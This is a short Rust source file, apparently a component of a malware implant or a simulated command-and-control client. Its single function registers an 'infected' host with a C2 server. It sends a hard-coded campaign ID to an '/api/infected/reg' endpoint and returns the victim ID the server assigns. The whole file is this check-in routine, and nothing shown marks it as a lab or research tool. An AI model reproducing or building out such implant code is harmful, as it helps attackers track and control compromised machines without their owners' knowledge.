use anyhow::Result;
use reqwest::Client;
use serde_json::{Value, json};

use crate::constants::compiled::{CCID, SIMCC_URL};

pub async fn request_iid() -> Result<String> {
    let client = Client::new();

    let res = client
        .post(SIMCC_URL("/api/infected/reg"))
        .json(&json!({
            "ccid": CCID
        }))
        .send()
        .await?
        .error_for_status()?;

    let body: Value = res.json().await?;

    Ok(String::from(
        body["iid"]
            .as_str()
            .ok_or(anyhow::anyhow!("Failed to get iid from body!"))?,
    ))
}
